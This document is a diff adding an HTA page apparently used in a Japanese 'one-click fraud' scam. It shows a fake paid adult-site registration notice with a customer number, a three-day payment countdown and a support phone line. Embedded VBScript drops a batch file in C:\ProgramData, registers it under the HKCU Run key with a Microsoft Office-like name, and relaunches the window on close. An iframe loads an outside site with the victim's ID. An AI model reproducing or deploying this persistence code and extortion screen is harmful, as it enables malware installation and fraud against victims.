@@ -1,0 +1,569 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"  "http://www.w3.org/TR/html4/strict.dtd">
+ 		  <html>
+ 	           <head>
+                   <meta charset="utf-8">
+		    <HTA:APPLICATION
+	 		  ID="objHTA_Info"
+			  APPLICATIONNAME="HTA_Info" 
+	  		  BORDER = "Thin"
+		 	  CAPTION = "No"
+			  CONTEXTMENU = "No"
+			  INNERBORDER = "No"
+			  MAXIMIZEBUTTON = "No"
+			  MINIMIZEBUTTON = "No"
+			  NAVIGABLE = "No"
+			  SCROLL = "No"
+			  SCROLLFLAT = "No"
+			  SELECTION = "No"			 
+			  SHOWINTASKBAR = "No"
+			  SINGLEINSTANCE = "Yes"		
+			  WINDOWSTATE="maximize"
+			/><script Language="VBScript" charset="UTF-8">	   				
+
+Dim intLeft
+		Dim intTop
+		Dim Shell
+		Dim oShell
+        Dim fso,obf,of
+		Dim objWMIServic,stComputer
+        NewDir = "C:\ProgramData\windowsmicromediatroop\"
+		
+        Set oShell = CreateObject("WScript.Shell")
+        Set fso = CreateObject("Scripting.FileSystemObject")
+        strComputerName = oShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )	
+		FullName  = replace(objHTA_Info.commandLine,chr(34),"")  
+		arrFN     = split(FullName,"\")  
+		FileName  = arrFN(ubound(arrFN))
+		SourceDir = replace(FullName,FileName,"") 	
+		FullName  = SourceDir & FileName	
+		appName = "MicrosoftExcelWordPowerPointPaintHTML"
+		
+		If fso.FolderExists(NewDir) Then
+		
+			boobsFile = NewDir&"MicrosoftXPExcelWordPowerPointPaint.bat"
+			Set boobs = fso.CreateTextFile(boobsFile,True)
+			boobs.Write "@echo off"&vbCrLf	
+                        boobs.Write "set run="&vbCrLf
+			boobs.Write "tasklist "&chr(47)&"fi "&chr(34)&"imagename eq mshta.exe"&chr(34)&" "&chr(124)&" find "&chr(34)&":"&chr(34)&chr(62)&" nul"&vbCrLf	
+			boobs.Write "if errorlevel 1 set run=yes"&vbCrLf
+			boobs.Write "if "&chr(34)&"%run%"&chr(34)&"=="&chr(34)&"yes"&chr(34)&" ("&vbCrLf
+			boobs.Write "echo hta is running"&vbCrLf
+			boobs.Write ") else ("&vbCrLf
+			boobs.Write "start "&chr(47)&"min mshta.exe "&FullName&vbCrLf
+			boobs.Write ")"&vbCrLf
+			boobs.Close
+			
+			appName = "MicrosoftExcelWordPowerPointPaintHTML"
+			hkcu = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\"&appName
+			oShell.RegWrite hkcu , chr(34)&boobsFile&chr(34) , "REG_SZ"				
+			
+		Else
+			fso.CreateFolder (NewDir)
+
+			boobsFile = NewDir&"MicrosoftXPExcelWordPowerPointPaint.bat"
+			Set boobs = fso.CreateTextFile(boobsFile,True)
+                        boobs.Write "@echo off"&vbCrLf
+			boobs.Write "set run="&vbCrLf	
+			boobs.Write "tasklist "&chr(47)&"fi "&chr(34)&"imagename eq mshta.exe"&chr(34)&" "&chr(124)&" find "&chr(34)&":"&chr(34)&chr(62)&" nul"&vbCrLf	
+			boobs.Write "if errorlevel 1 set run=yes"&vbCrLf
+			boobs.Write "if "&chr(34)&"%run%"&chr(34)&"=="&chr(34)&"yes"&chr(34)&" ("&vbCrLf
+			boobs.Write "echo hta is running"&vbCrLf
+			boobs.Write ") else ("&vbCrLf
+			boobs.Write "start "&chr(47)&"min mshta.exe "&FullName&vbCrLf
+			boobs.Write ")"&vbCrLf		
+			boobs.Close	
+			
+			appName = "MicrosoftExcelWordPowerPointPaintHTML"
+			hkcu = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\"&appName
+			oShell.RegWrite hkcu ,chr(34)&boobsFile&chr(34),"REG_SZ" 
+							
+		End If	   	
+			
+		stComputer = "."			
+		//Set objWMIService = GetObject("winmgmts:\" & stComputer & "\root\cimv2")
+		Set objWMIService = GetObject("winmgmts:" _
+				& "{impersonationLevel=impersonate}!\\" _
+				& stComputer & "\root\cimv2") 
+				
+		sQuery = "SELECT * FROM Win32_Process"
+		Set objItems = objWMIService.ExecQuery(sQuery)	
+		intSize = 0
+		Dim arrTestArray()
+			
+		Set oShell = CreateObject("WScript.Shell")
+		For Each objItem In objItems
+			ReDim Preserve arrTestArray(intSize)
+			arrTestArray(intSize) = objItem.Name
+			intSize = intSize + 1
+			If  objItem.Name = "mshta.exe" Then								
+				oShell.Run  "C:\ProgramData\windowsmicromediatroop\MicrosoftXPExcelWordPowerPointPaint.bat",,2
+				//MsgBox "mara khaise"
+			  Exit For		
+			End If
+		Next
+		
+		Sub test		    	
+			oShell.Run "C:\ProgramData\windowsmicromediatroop\MicrosoftXPExcelWordPowerPointPaint.bat",,2			
+			//MsgBox "bolod"
+		End Sub	  		
+	  		
+	</script>
+
+<script Language="Javascript" type="text/javascript" charset="UTF-8" >
+ document.cookie="moga_client_id=950313";
+</script>
+</head><body onunload="test()"  bgcolor="white">会員ＩＤ: U-950313<br/><style>
+h1,h2,h3,h4,h5,h6,p,ul,ol,li,dl,dt,dd,table,th,tr,form,img,input,select,body {   
+margin: 0;
+padding: 0;
+font-size: 12px;
+}
+ul,ol,li {
+list-style: none;
+}
+img {
+border: 0;
+}
+body {
+font-family:"メイリオ",Meiryo, "ＭＳ Ｐゴシック", Osaka, "ヒラギノ角ゴ Pro W3";
+padding: 0;
+margin: 0;
+background-color: #ffffff;
+}
+
+/* general classes */
+.clear {
+clear: both;
+}
+.padding {
+padding: 4px;
+}
+.clickable {
+cursor: pointer;
+}
+
+/**
+ * block layouts
+ *   #m-wrap (for main app)
+ *     #top-bar (for first infomation notices of 2)
+ *     #content (for wrapping 2 following blocks)
+ *       #image-bar (for showing image)
+ *       #messages (for messages to the customer)
+ *         #ibox (for important notices)
+ *         #history (for history played by the customer)
+ *     #bottom-bar (for second information notices of 2)
+ *   #p-warp (for player app)
+ */
+#m-wrap {
+width: 700px;
+height: 500px;
+position: relative;
+}
+#top-bar {
+width: 700px;
+height: 60px;
+position: absolute;
+left: 0;
+top: 0;
+background-color: #4b7c7e;
+}
+#content {
+width: 700px;
+height: 400px;
+position: absolute;
+left: 0;
+top: 60px;
+}
+#bottom-bar {
+width: 700px;
+height: 40px;
+position: absolute;
+left: 0;
+top: 460px;
+background-color: #4b7c7e;
+}
+#image-bar {
+width: 180px;
+height: 400px;
+float: left;
+background-image: url(bg.jpg);
+background-repeat: no-repeat;
+}
+#messages {
+width: 520px;
+height: 400px;
+float: right;
+background-color: #f5e0ed;
+}
+#p-wrap {
+width: 700px;
+height: 40px;
+position: relative;
+background-color: #666666;
+}
+
+/* #top-bar */
+#top-bar .uid_subject {
+position: absolute;
+left: 8px;
+top: 4px;
+font-size: 12px;
+color: #ffffff;
+}
+#top-bar .uid_body {
+position: absolute;
+left: 8px;
+top: 20px;
+font-size: 26px;
+font-weight: bold;
+color: #ff0000;
+}
+#top-bar .reg_subject {
+position: absolute;
+left: 188px;
+top: 4px;
+font-size: 12px;
+color: #ffffff;
+}
+#top-bar .reg_body {
+position: absolute;
+left: 188px;
+top: 20px;
+font-size: 26px;
+font-weight: bold;
+color: #ffffca;
+}
+#btn-confirm {
+position: absolute;
+left: 522px;
+top: 4px;
+width: 174px;
+height: 52px;
+line-height: 16px;
+text-align: center;
+overflow: hidden;
+font-size: 18px;
+}
+#btn-confirm div {
+background-color: #fd5bff;
+border: outset 4px;
+margin: 0;
+padding-top: 6px;
+padding-bottom: 6px;
+font-weight: bold;
+}
+#btn-confirm span {
+font-size: 11px;
+}
+
+/* #bottom-bar */
+#bottom-bar .term_subject {
+position: absolute;
+left: 8px;
+font-size: 16px;
+font-weight: bold;
+color: #ffffff;
+line-height: 40px;
+}
+#bottom-bar .form {
+position: absolute;
+left: 344px;
+top: 8px;
+width: 130px;
+height: 24px;
+background-color: #ffffff;
+overflow: hidden;
+}
+#bottom-bar .form input {
+margin: 2px;
+border: 0;
+}
+#btn-pass {
+position: absolute;
+left: 482px;
+top: 8px;
+width: 60px;
+height: 24px;
+text-align: center;
+}
+#btn-pass div {
+background-color: #d4d0c8;
+border: outset 4px;
+margin: 0;
+font-weight: bold;
+line-height: 16px;
+}
+#btn-route {
+position: absolute;
+left: 550px;
+top: 8px;
+width: 142px;
+height: 24px;
+text-align: center;
+}
+#btn-route div {
+background-color: #fd5bff;
+border: outset 4px;
+margin: 0;
+font-weight: bold;
+line-height: 16px;
+}
+
+/* #image-bar */
+#image-bar .inside {
+padding: 8px;
+}
+#btn-show-list {
+border: outset 4px;
+height: 20px;
+line-height: 20px;
+position: relative;
+top: 356px;
+background-color: #d4d0c8;
+text-align: center;
+}
+
+/* #messages */
+#messages {
+}
+
+/* #ibox */
+#ibox {
+width: 520px;
+height: 320px;
+overflow: hidden;
+}
+#ibox .inside {
+}
+#ibox .text1 {
+display: none;
+padding: 2px;
+text-align: center;
+font-weight: bold;
+}
+#ibox .text2 {
+padding: 2px;
+background-color: #000000;
+color: #ffff00;
+font-size: 14px;
+font-weight: bold;
+margin-top:5px;
+}
+#ibox .text3 {
+padding: 2px;
+background-color: #555555;
+color: #ffffff;
+font-size: 13px;
+line-height:140%;
+margin:5px 0 5px 0;
+}
+#ibox .text3 span {
+background-color: #ffff00;
+color: #555555;
+font-weight:bold;
+}#ibox .text3a {
+padding: 2px;
+background-color: #ff6565;
+font-size: 14px;
+color: #ffffff;
+margin:5px 0 5px 0;
+}
+#ibox .text3a span {
+background-color: #ff0000;
+color: #ffffff;
+font-size: 14px;
+font-weight:bold;
+}
+#ibox .text4 {
+padding: 2px;
+background-color: #ffffff;
+color: #880088;
+font-weight: bold;
+line-height:110%;
+}
+#ibox .text5 {
+padding: 2px;
+line-height: 14px;
+font-size: 12px;
+}
+#ibox .text5 span {
+font-weight: bold;
+}
+#ibox .text6 {
+padding: 2px;
+background-color: #ffffff;
+color: #880088;
+font-weight: bold;
+line-height:110%;
+margin-top:5px;
+}
+#ibox .text7 {
+padding: 2px;
+line-height: 14px;
+font-size: 11px;
+}
+#ibox .text7 span {
+font-weight: bold;
+color: #ff0000;
+}
+#ibox .text8 {
+padding: 2px;
+background-color: #fff999;
+line-height: 14px;
+}
+#ibox .text8-1 {
+font-weight: bold;
+font-size: 14px;
+color: #000000;
+margin: 5px 0 9px 0;
+}
+#ibox .text8-2 {
+font-weight: bold;
+font-size: 22px;
+color: #0000ff;
+text-align:center;
+margin-bottom: 9px;
+}
+#ibox .text8-3 {
+font-weight: bold;
+font-size: 14px;
+color: #000000;
+margin-bottom: 3px;
+}
+#ibox .text8-4 {
+font-weight: bold;
+font-size: 16px;
+color: #0000ff;
+margin-left: 12px;
+}
+#ibox .text8-3 span {
+color: #ff0000;
+}
+
+/* #history */
+#history {
+width: 520px;
+height: 80px;
+overflow: hidden;
+background-color: #333333;
+color: #ffffff;
+}
+#history .subject {
+height: 12px;
+line-height: 12px;
+font-size: 10px;
+padding-left: 2px;
+overflow: hidden;
+}
+
+/* player */
+#p-wrap {
+width: 700px;
+height:660px;
+}
+#display {
+width: 700px;
+height: 600px;
+overflow-y: scroll;
+background-color: #ffffff;
+}
+.p-subject {
+height:22px;
+padding: 4px;
+text-align: center;
+background-color: #333333;
+color: #ffffff;
+font-weight: bold;
+font-size: 14px;
+}
+.p-show-main {
+height:22px;
+padding: 4px;
+text-align: center;
+background-color: #666666;
+color: #ffffff;
+font-weight: bold;
+font-size: 14px;
+}
+.p-show-main a {
+color: #ffffff;
+}
+
+/* ajax */
+#ajax-history {
+background-color: #888888;
+height: 68px;
+overflow: hidden;
+}
+
+</style>
+</head>
+<body>
+
+<div id="m-wrap">
+<div id="top-bar">
+<div>
+<div class="uid_subject">>> お客様ナンバー <<</div>
+<div class="uid_body"><span id="d1">56789012</span></div>
+<div class="reg_subject">>> ご登録日時 <<</div>
+<div class="reg_body"><span id="d2">2013/01/01</span></div>
+<div id="btn-confirm" class="clickable"><div id="topconf">||| 確認ボタン |||<br /><span style="font-size:13px;">(画面削除について)</span></div></div>
+</div><!--/.inside-->
+</div><!--/#top-bar-->
+<div id="content">
+<div id="image-bar">
+<div class="inside">
+<div id="btn-show-list" class="clickable">動画の一覧</div>
+</div><!--/.inside-->
+</div><!--/#image-bar-->
+<div id="messages">
+ <div id="ibox">
+        <div class="inside">
+          <div class="text1"> 【※有料アダルトサイトへの登録お知らせ画面※】</div>
+          <!--/.text1-->
+          <div class="text2"> アダルトサイトへのご登録が完了しておりますので下記をご確認下さいませ。</div>
+          <!--/.text2-->
+          <div class="text3a">未成年者が利用したと思われる親御さんはお電話を頂ければ<u><font color="0000ff">無償にて解除や対処が出来ますのでお電話</font></u>下さい。最近18歳未満のアダルトサイト利用が急増しております。18歳未満のアダルトサイトの利用は日本の法律で禁止されております。</div>
+          <!--/.text3-->
+          
+          <div class="text3">お客様は電子契約法に基づく入会手順を超えて当有料サイトにご登録されました。<br>有料・料金表示が記載してあった事を確認したい方や、この画面の削除方法など詳細は右上の「確認ボタン」をクリックして開いたページにてご確認下さい。B</div>
+          <div class="text8">
+            <div class="text8-1">【 サポート窓口 ／ 平日 09:00～20:00 ｜ 土・日曜／祝日 12:00～18:00 】</div>
+            <div class="text8-2">[ 080－xxxx－xxx ] [ info@xxx.com ] </div>
+            <div class="text8-3"><span>「お客様ナンバー」</span>をお伝え頂けませんと対応が出来ませんのでご注意下さい。</div>
+          </div>
+          <!--/.text8-->
+          <div class="text6"> ※ 注意事項 ※ （登録前の2ページの利用規約にも記載しています）</div>
+          <!--/.text6-->
+          <div class="text7"> (1) お支払い期日は<span>上記の登録日より３日以内</span>です<strong>（金額表示はTOPページから一番上に記載アリ）<br />
+            (2) この画面は、<span>ご入金確認後に右上の「確認ボタン」をクリック</span>すれば削除できます。<br />
+            （平日の15時以降や土曜/日曜/祝日でのご入金の場合は、翌平日の11時以降の削除処理です） </div>
+          <!--/.text7-->
+        </div>
+   <!--/.inside-->
+      </div>
+ <!--/#ibox-->
+  <div id="history">
+<div class="subject">【 動画の再生履歴 】※最新8件のみ表示</div>
+<div id="ajax-history"></div><!--/#ajax-history-->
+</div><!--/#history-->
+</div><!--/#messages-->
+</div><!--/#content-->
+<div id="bottom-bar">
+<div>
+<div class="term_subject">期日まで : <span id="d3" class="term_body">71時間59分59秒</span></div>
+<div class="form"><input type="text" id="t1" name="pw" /></div>
+<div id="btn-pass" class="clickable"><div id="btmpass">予備</div></div>
+<div id="btn-route" class="clickable"><div>この画面の削除方法</div></div>
+</div><!--/.inside-->
+</div><!--/#bottom-bar-->
+<div class="clear"></div>
+</div>
+<!--/#m-wrap-->
+<div id="p-wrap">
+<div class="p-subject">動画プレイヤー <span style="font-size: 11px;">有料アダルトサイトに正規の手順を踏まれ登録が完了しました。(動画再生準備完了)</span></div><!-- } .p-subject; -->
+<div id="display"></div><!-- } #display; -->
+<div class="p-show-main"><a href="#back" onClick="return showMain()">お知らせ画面に戻る</a></div><!-- } .p-show-main; -->
+</div><!--/#p-wrap--><iframe id="frame"  height="100%" width="100%" application="yes" style="height:510px;" src="http://cream-netca.com/spa/download/test.php?cl=950313"></iframe>         
+			</body>
+		</html>
